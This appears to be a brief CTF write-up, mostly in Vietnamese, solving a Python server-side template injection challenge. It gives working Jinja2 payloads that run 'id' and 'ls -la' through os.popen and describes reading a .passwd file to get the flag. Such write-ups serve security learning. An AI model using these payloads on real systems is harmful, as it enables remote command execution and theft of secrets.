# Python - Server-side Template Injection Introduction

25 points

Statement: This service allows you to generate a web page. Use it to read the flag!

# Solution

Ta có form challenge như sau. Có phần input `tilte` và `page content`. Mình thử payload vào 2 phần thì chỉ có `page content` là inject được.

![image](https://github.com/Llam-a/Server-Side-Template-Injection/assets/115911041/11e93d80-9eaf-4d77-b2e1-d98bff7fc20d)

Bài này thì đơn giản thôi. Bởi vì tên bài là java nên mình vào hacktricks kiếm payload. Đây là payload mình dùng 

`{{ cycler.__init__.__globals__.os.popen('id').read() }}`

![image](https://github.com/Llam-a/Server-Side-Template-Injection/assets/115911041/3ee82e4f-6169-43f8-ad7c-468f92e140b6)

Và có thể sử dụng được, tiếp tục dùng lệnh `ls -la` để list tất cả file

`{{ cycler.__init__.__globals__.os.popen('ls -la').read() }}`

![image](https://github.com/Llam-a/Server-Side-Template-Injection/assets/115911041/bf9919d1-3831-42a0-b1b8-654726c7b2c7)

Có một file tên là `.passwd` sau đó chỉ cần dùng lên cat là ta có được flag

![image](https://github.com/Llam-a/Server-Side-Template-Injection/assets/115911041/f73845fd-9dd8-488b-a285-bafd92bdb5ae)
